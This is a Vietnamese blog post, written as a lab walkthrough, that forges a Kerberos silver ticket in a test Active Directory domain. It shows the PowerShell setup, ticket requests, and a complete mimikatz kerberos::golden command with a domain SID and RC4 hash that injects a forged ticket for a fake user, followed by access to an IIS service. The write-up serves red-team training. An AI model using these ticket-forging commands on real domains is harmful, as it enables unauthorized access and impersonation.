<!DOCTYPE html><html lang="[&quot;en&quot;,&quot;vi&quot;,&quot;default&quot;]" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Ired.Team Kerberos Silver Ticket Execution | Phat Mai Blog</title><meta name="author" content="Phat Mai"><meta name="copyright" content="Phat Mai"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="Ired.Team Kerberos Silver TicketTiếp tục chuỗi series AD abuse thì tiếp theo ta tiến tới Kerberos Silver Ticket có nghĩa là ta sẽ hack quyền từ Kerberos nhưng không phải tạo golden ticket để truy cập">
<meta property="og:type" content="article">
<meta property="og:title" content="Ired.Team Kerberos Silver Ticket Execution">
<meta property="og:url" content="https://pzhat.github.io/2025/11/15/2025-11-15-I.redteam-Kerberos-Silver-Ticket/index.html">
<meta property="og:site_name" content="Phat Mai Blog">
<meta property="og:description" content="Ired.Team Kerberos Silver TicketTiếp tục chuỗi series AD abuse thì tiếp theo ta tiến tới Kerberos Silver Ticket có nghĩa là ta sẽ hack quyền từ Kerberos nhưng không phải tạo golden ticket để truy cập">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://pzhat.github.io/img/avatar.jpg">
<meta property="article:published_time" content="2025-11-14T19:34:38.244Z">
<meta property="article:modified_time" content="2025-11-15T04:51:05.963Z">
<meta property="article:author" content="Phat Mai">
<meta property="article:tag" content="Pentest">
<meta property="article:tag" content="RedTeam">
<meta property="article:tag" content="iredteam">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://pzhat.github.io/img/avatar.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Ired.Team Kerberos Silver Ticket Execution",
  "url": "https://pzhat.github.io/2025/11/15/2025-11-15-I.redteam-Kerberos-Silver-Ticket/",
  "image": "https://pzhat.github.io/img/avatar.jpg",
  "datePublished": "2025-11-14T19:34:38.244Z",
  "dateModified": "2025-11-15T04:51:05.963Z",
  "author": [
    {
      "@type": "Person",
      "name": "Phat Mai",
      "url": "https://pzhat.github.io"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://pzhat.github.io/2025/11/15/2025-11-15-I.redteam-Kerberos-Silver-Ticket/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.4/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Failed',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Ired.Team Kerberos Silver Ticket Execution',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><link rel="stylesheet" href="/css/mobile-cover-fix.css"><meta name="generator" content="Hexo 8.1.1"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">Loading...</div></div></div><script>(()=>{
  const $loadingBox = document.getElementById('loading-box')
  const $body = document.body
  const preloader = {
    endLoading: () => {
      if ($loadingBox.classList.contains('loaded')) return
      $body.style.overflow = ''
      $loadingBox.classList.add('loaded')
    },
    initLoading: () => {
      $body.style.overflow = 'hidden'
      $loadingBox.classList.remove('loaded')
    }
  }

  preloader.initLoading()

  if (document.readyState === 'complete') {
    preloader.endLoading()
  } else {
    window.addEventListener('load', preloader.endLoading)
    document.addEventListener('DOMContentLoaded', preloader.endLoading)
    // Add timeout protection: force end after 7 seconds
    setTimeout(preloader.endLoading, 7000)
  }

  if (false) {
    btf.addGlobalFn('pjaxSend', preloader.initLoading, 'preloader_init')
    btf.addGlobalFn('pjaxComplete', preloader.endLoading, 'preloader_end')
  }
})()</script><div id="web_bg" style="background-image: url(/img/background2.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">40</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">9</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/cover.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Phat Mai Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">Ired.Team Kerberos Silver Ticket Execution</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> About</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Ired.Team Kerberos Silver Ticket Execution</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-11-14T19:34:38.244Z" title="Created 2025-11-15 02:34:38">2025-11-15</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-11-15T04:51:05.963Z" title="Updated 2025-11-15 11:51:05">2025-11-15</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/RedTeam/">RedTeam</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/RedTeam/pentesting/">pentesting</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="Ired-Team-Kerberos-Silver-Ticket"><a href="#Ired-Team-Kerberos-Silver-Ticket" class="headerlink" title="Ired.Team Kerberos Silver Ticket"></a>Ired.Team Kerberos Silver Ticket</h1><p>Tiếp tục chuỗi series <code>AD abuse</code> thì tiếp theo ta tiến tới <code>Kerberos Silver Ticket</code> có nghĩa là ta sẽ hack quyền từ Kerberos nhưng không phải tạo <code>golden ticket</code> để truy cập mọi tài nguyên trong DC mà ở đây ta chỉ tạo <code>Silver Ticket</code> có quyền truy cập một số tài nguyên nhất định vì đôi khi ta cũng không cần phải full quyền để làm gì nhiều lúc sẽ dễ bị phát hiện nên ta chỉ cần lấy một vài tài nguyên, chính điều đó thì Silver Ticket ra đời.</p>
<h3 id="Execution"><a href="#Execution" class="headerlink" title="Execution"></a>Execution</h3><h4 id="Buoc-1-Chuan-bi-moi-truong"><a href="#Buoc-1-Chuan-bi-moi-truong" class="headerlink" title="Bước 1: Chuẩn bị môi trường"></a>Bước 1: Chuẩn bị môi trường</h4><ul>
<li>Một <code>domain controller</code> (Ở đây tôi có: dc-mantvydas.offense.local)</li>
<li>Một máy <code>client</code> tham gia domain (Ở đây mình dùng DC-RED)</li>
<li>Quyền <code>admin</code> trên domain để tạo tài khoản dịch vụ (hoặc ít nhất có quyền tạo user)</li>
</ul>
<h4 id="Buoc-2-Tao-user-service-account-co-password-yeu"><a href="#Buoc-2-Tao-user-service-account-co-password-yeu" class="headerlink" title="Bước 2: Tạo user&#x2F;service account có password yếu"></a>Bước 2: Tạo user&#x2F;service account có password yếu</h4><p>Đầu tiên ta sẽ dùng lệnh <code>PowerShell</code> ở trên máy DC để tạo ra <code>http service</code> có password yếu.</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Tạo user mới - dùng làm service account</span></span><br><span class="line"><span class="built_in">New-ADUser</span> <span class="literal">-Name</span> <span class="string">&quot;svc_http&quot;</span> <span class="literal">-SamAccountName</span> <span class="string">&quot;svc_http&quot;</span> <span class="literal">-AccountPassword</span> (<span class="built_in">ConvertTo-SecureString</span> <span class="string">&quot;Passw0rd&quot;</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span>) <span class="literal">-Enabled</span> <span class="variable">$true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Gán quyền SPN cho user này (để nó trở thành service account)</span></span><br><span class="line"><span class="built_in">Set-ADUser</span> <span class="literal">-Identity</span> <span class="string">&quot;svc_http&quot;</span> <span class="literal">-ServicePrincipalNames</span> <span class="selector-tag">@</span>&#123;Add=<span class="string">&quot;HTTP/dc-mantvydas.offense.local&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Buoc-3-Xac-minh-SPN-da-duoc-gan"><a href="#Buoc-3-Xac-minh-SPN-da-duoc-gan" class="headerlink" title="Bước 3: Xác minh SPN đã được gán"></a>Bước 3: Xác minh SPN đã được gán</h4><p>Sau đó tiếp tục ta sẽ sử dụng các lệnh sau để xác mình rằng đã có <code>SPN</code> được gán vào.</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setspn <span class="literal">-S</span> HTTP/dc<span class="literal">-mantvydas</span>.offense.local svc_http</span><br><span class="line"><span class="built_in">Get-ADUser</span> svc_http <span class="literal">-Properties</span> Enabled, PasswordNeverExpires, ServicePrincipalNames</span><br></pre></td></tr></table></figure>

<p><img src="https://hackmd.io/_uploads/SkOg2kSxWe.png" alt="image"></p>
<p>Okay kết quả trả về khả quan rồi.</p>
<h4 id="Buoc-4-Thuc-hien-Kerberoasting-tu-may-tan-cong"><a href="#Buoc-4-Thuc-hien-Kerberoasting-tu-may-tan-cong" class="headerlink" title="Bước 4: Thực hiện Kerberoasting từ máy tấn công"></a>Bước 4: Thực hiện Kerberoasting từ máy tấn công</h4><p>Bây giờ mình sẽ truy cập máy <code>windows attacker</code> của mình đó là <code>DC-RED</code> để khai thác.</p>
<p><img src="https://hackmd.io/_uploads/S1IRTJHgbl.png" alt="image"></p>
<p>Ở đây mình dùng 2 lệnh đó là : </p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Add-Type</span> <span class="literal">-AssemblyName</span> System.IdentityModel</span><br><span class="line"><span class="built_in">New-Object</span> System.IdentityModel.Tokens.KerberosRequestorSecurityToken <span class="literal">-ArgumentList</span> <span class="string">&quot;HTTP/dc-mantvydas.offense.local&quot;</span></span><br></pre></td></tr></table></figure>

<p>2 lệnh trên có mục đích là lấy TGS Ticket hay còn gọi đó là bước kerberoasting ở đây sau khi thực thi thì hệ thống sẽ lưu ticket vào cache của Kerberos sau đó ta sẽ phải lấy thêm NTLM hash, ở đây mình set password cho service là <code>Passw0rd</code> nên bỏ qua bước đó lấy thẳng NTLM hash của nó là <code>a87f3a337d73085c45f9416be5787d86</code>.</p>
<h4 id="Buoc-5-Tao-Silver-Ticket-voi-Mimikatz"><a href="#Buoc-5-Tao-Silver-Ticket-voi-Mimikatz" class="headerlink" title="Bước 5: Tạo Silver Ticket với Mimikatz"></a>Bước 5: Tạo Silver Ticket với Mimikatz</h4><p>Ở đây ta thực hiện đoạn lệnh là : </p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /user</span><br></pre></td></tr></table></figure>

<p>Với mục đích đó là lấy được <code>Domain SID</code> của user hiện tại.</p>
<p><img src="https://hackmd.io/_uploads/ryV-kgHeZe.png" alt="image"></p>
<p>Ta sẽ note cái SID này vào để còn dùng trong mimikatz <code>S-1-5-21-1522518357-539094533-3136975768-1000</code></p>
<p>Sau đó ta tiến hành chạy <code>mimikat</code> ở đây mình sẽ spawn một cmd từ tool có tên là PsExec để chạy cmd với quyền cao nhất.</p>
<p>Sau đó ở trong mimikatz ta sẽ chạy lệnh sau : </p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">kerberos::<span class="title">golden</span> /<span class="title">sid:S</span>-1-5-21-1522518357-539094533-3136975768 /<span class="title">domain:offense</span>.<span class="title">local</span> /<span class="title">ptt</span> /<span class="title">id</span>:1000 /<span class="title">target:dc</span>-<span class="title">mantvydas.offense.local</span> /<span class="title">service:http</span> /<span class="title">rc4:a87f3a337d73085c45f9416be5787d86</span> /<span class="title">user:benignadmin</span></span></span><br></pre></td></tr></table></figure>

<p>Lệnh này sử dụng tự động tạo ticket và <code>inject</code> nó vào ở đây ta dùng những thứ mà ta đã tìm được lúc nãy bao gồm <code>Domain SID</code> , <code>NTLM hash</code> và ở đây user được gán Silver Ticket mình để tên là <code>benignadmin</code>.</p>
<p><img src="https://hackmd.io/_uploads/HJunllHgWe.png" alt="image"></p>
<p>Thành công chạy lệnh nó trả về cho ta kết quả đó là <code>Pass The Ticket</code> là kết quả đã được, bây giờ để xác nhận rằng Ticket đã được inject ta sẽ exit mimikatz sau đó chạy lệnh <code>klist</code> để confirm.</p>
<p><img src="https://hackmd.io/_uploads/B1yKbxBxWl.png" alt="image"></p>
<p>Chuẩn bài rồi ta thấy tên <code>client</code> đã đúng là <code>benignadmin @ offense.local</code> bây giờ ta tới với bước thực hiện vài lệnh khai thác service.</p>
<h4 id="Buoc-6-Khai-thac-Truy-cap-Service"><a href="#Buoc-6-Khai-thac-Truy-cap-Service" class="headerlink" title="Bước 6: Khai thác - Truy cập Service"></a>Bước 6: Khai thác - Truy cập Service</h4><p>Ta tiến hành gửi <code>HTTP request</code> dùng ticket với lệnh : </p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-WebRequest</span> <span class="literal">-UseBasicParsing</span> <span class="literal">-UseDefaultCredentials</span> http://dc<span class="literal">-mantvydas</span>.offense.local</span><br></pre></td></tr></table></figure>

<p><img src="https://hackmd.io/_uploads/HyEDXgBebx.png" alt="image"></p>
<p>Phân tích kết quả : </p>
<ul>
<li>StatusCode: 200 → HTTP request thành công.</li>
<li>Nội dung trả về là trang mặc định của IIS → chứng tỏ service HTTP đang chạy.</li>
<li>Vì mình dùng -UseDefaultCredentials, hệ thống đã tự động đính kèm Kerberos ticket inject trước đó (Silver Ticket cho benignadmin) vào request.</li>
<li>IIS trên dc-mantvydas.offense.local chấp nhận ticket → xác thực thành công dù benignadmin không tồn tại thực sự trong Active Directory.</li>
</ul>
<p><img src="https://hackmd.io/_uploads/HkwsEeBxWx.png" alt="image"></p>
<p>Sau đó check ở <code>Event Viewer</code> của DC thì thấy được <code>request Logon</code> của user fake mà mình tạo vậy là hoàn thành lab Kerberos Silver Ticket.</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://pzhat.github.io">Phat Mai</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://pzhat.github.io/2025/11/15/2025-11-15-I.redteam-Kerberos-Silver-Ticket/">https://pzhat.github.io/2025/11/15/2025-11-15-I.redteam-Kerberos-Silver-Ticket/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/RedTeam/">RedTeam</a><a class="post-meta__tags" href="/tags/Pentest/">Pentest</a><a class="post-meta__tags" href="/tags/iredteam/">iredteam</a></div><div class="post-share"><div class="social-share" data-image="/img/avatar.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/11/16/2025-11-16-CORS-PortSwigger/" title="PortSwigger CORS (Cross-Origin Resource Sharing) challenge WriteUp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">PortSwigger CORS (Cross-Origin Resource Sharing) challenge WriteUp</div></div><div class="info-2"><div class="info-item-1">PortSwigger CORS (Cross-Origin Resource Sharing) challenge WriteUpOverview về CORSCORS là gì? Vì sao lại xuất hiện CORS (Cross-Origin Resource Sharing) là một cơ chế bảo mật trong web cho phép các tài nguyên trên một máy chủ được chia sẻ với các trang web có nguồn (origin) khác. “Nguồn” ở đây được định nghĩa bởi ba yếu tố: giao thức (http, https), tên miền (domain), và cổng (port).  Theo mặc định, các trình duyệt web tuân thủ Chính sách Cùng Nguồn Gốc (Same-Origin Policy - SOP). Chính sách nà...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-11-14-CSRF-PortSwigger-Challenge/" title="PortSwigger CSRF Challenge WriteUps"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">PortSwigger CSRF Challenge WriteUps</div></div><div class="info-2"><div class="info-item-1">PortSwigger CSRF Challenge WriteUpGiới thiệu về CSRF (Cross-Site Request Forgery)Lỗ hổng CSRF là gì : Cross-Site Request Forgery hay còn gọi theo tiếng việt là giả mạo yêu cầu trên nhiều trang, là một lỗ hổng bảo mật cho phép attacker lừa người dùng đã được xác thực (đã đăng nhập) thực hiện các hành động không mong muốn trên 1 ứng dụng Web. Nói đơn giản thì attacker sẽ mượn danh tính và session của một victim để gửi đi một yêu cầu giả mạo đến ứng dụng mà victim không hề hay biết. Nếu ứng dụng...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/11/15/2025-10-30-iredteam-from-DA-to-EA/" title="Ired.Team From Domain Admin to Enterprise Admin"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">Ired.Team From Domain Admin to Enterprise Admin</div></div><div class="info-2"><div class="info-item-1">Ired.Team From Domain Admin to Enterprise AdminOverviewỞ lab này ta sẽ lợi dụng mối quan hệ giữa Parent-Child domain từ đó lợi dụng mối quan hệ đó và gây nên leo thang đặc quyền. Build lab SetUp domain đặt tên là offense.local đây là domain cha với IP là 192.168.10.10/24 và DNS: 127.0.0.1.   Đã cài xong Active Directory Domain Services (AD DS).  Đã promote máy thành Domain Controller cho domain: offense.local.  Đã có DNS Server chạy trên DC.  Đang dùng VMware host-only network.   Sau đó setup...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-11-03-I.redteam-Kerberoasting/" title="Ired.Team Kerberoasting (Credential Access)"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">Ired.Team Kerberoasting (Credential Access)</div></div><div class="info-2"><div class="info-item-1">Ired.Team Kerberoasting (Credential Access)Giải thích về các khái niệmKerberos trong Active Directory Trong môi trường Windows Active Directory (AD), Kerberos là giao thức xác thực mặc định. Nó sử dụng các ticket để xác thực người dùng và dịch vụ mà không truyền mật khẩu qua mạng.  Các thành phần chính:  KDC (Key Distribution Center): Thường là Domain Controller (DC). TGT (Ticket Granting Ticket): Cấp cho user sau khi đăng nhập thành công → dùng để xin ticket cho dịch vụ. TGS (Ticket Granting...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-11-07-I.redteam-Kerberos-Golden-Ticket/" title="Ired.Team Kerberos Golden Tickets Lab"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">Ired.Team Kerberos Golden Tickets Lab</div></div><div class="info-2"><div class="info-item-1">Ired.Team Kerberos: Golden Tickets LabOverviewLab này khám phá một cuộc tấn công vào Kerberos Authentication của Active Directory(AD). Chính xác hơn, đây là một cuộc tấn công giả mạo Vé cấp quyền Kerberos (TGT) được sử dụng để xác thực User bằng Kerberos. TGT được sử dụng khi Ticket Granting Service (TGS), nghĩa là một TGT giả có thể giúp chúng ta có được bất kỳ ticket TGS nào. Mục tiêu của lab (Lab Goal)Tạo một Golden Ticket – một Ticket Granting Ticket (TGT) giả mạo – cho phép bạn:  Xác thự...</div></div></div></a><a class="pagination-related" href="/2025/12/02/2025-12-02-iredTeam-AS-REP-Roasting/" title="IredTeam AS-REP Roasting"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-02</div><div class="info-item-2">IredTeam AS-REP Roasting</div></div><div class="info-2"><div class="info-item-1">IredTeam AS-REP RoastingAS-REP là gì?AS-REP (viết tắt của Authentication Service Reply) là một thông điệp trong giao thức xác thực Kerberos. Đây là bước thứ hai trong quá trình xác thực ban đầu, được gửi từ Key Distribution Center (KDC), thường là một Domain Controller trong môi trường Active Directory, đến người dùng. Thông điệp này chứa Ticket-Granting Ticket (TGT), một ticket được mã hóa dùng để yêu cầu các vé dịch vụ khác mà không cần người dùng phải nhập lại mật khẩu. Một phần của thông ...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-09-09-Pickle-Rick-THM/" title="TryHackme Pickle Rick Challenge WriteUp by Phatmh."><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">TryHackme Pickle Rick Challenge WriteUp by Phatmh.</div></div><div class="info-2"><div class="info-item-1">TryHackme Pickle Rick Challenge WriteUp by Phatmh.[link challenge]:https://tryhackme.com/room/picklerickTiến hành dùng Openvpn kết nối với Tryhackme.Tiến hành kiểm tra mình đã cùng mạng mới máy bên Tryhackme hay chưa.Câu hỏi và Ip của challenge nãy đã test và kết nối thành công. Bước 1: ReconSử dụng Nmap để tiến hành kiểm tra xem có port nào đang được mở ra, ở đây phát hiện ra được bên máy đang mở port 22&#x2F;tcp và port 88&#x2F;tcp ở đây tôi nghĩ là server nạn nhân đang chạy SSH và HTTP. Tư...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-09-09-THM-EvilGPT/" title="Tryhackme EvilGPT challenge WriteUp by @phatmh"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">Tryhackme EvilGPT challenge WriteUp by @phatmh</div></div><div class="info-2"><div class="info-item-1">Tryhackme EvilGPT challenge WriteUp by @phatmhDùng netcat để tiến hành kết nối với chall và tiến hành LLM Inject để có thể moi được flag từ con AI.Sau khi test thử thì đây không phải con AI bình thường như tôi nghĩ mà nó là một con AI thực thi các câu lệnh OS vậy bây giờ tiến hành thử moi ra các thứ có trong server.Tiến hành đọc thử source code của con AI xem nó có những cái gì. Tóm tắt chức năngTập tin Python evilai.py là một server Telnet đơn giản. Khi người dùng kết nối, nó: Nhận yêu cầu t...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Phat Mai</div><div class="author-info-description">Pentester/Redteam</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">40</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">9</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/pzhat"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/pzhat" target="_blank" title="GitHub"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="https://www.linkedin.com/in/phat-mai-hong-2580a52aa/" target="_blank" title="LinkedIn"><i class="fab fa-linkedin" style="color: #0A66C2;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">Blog about 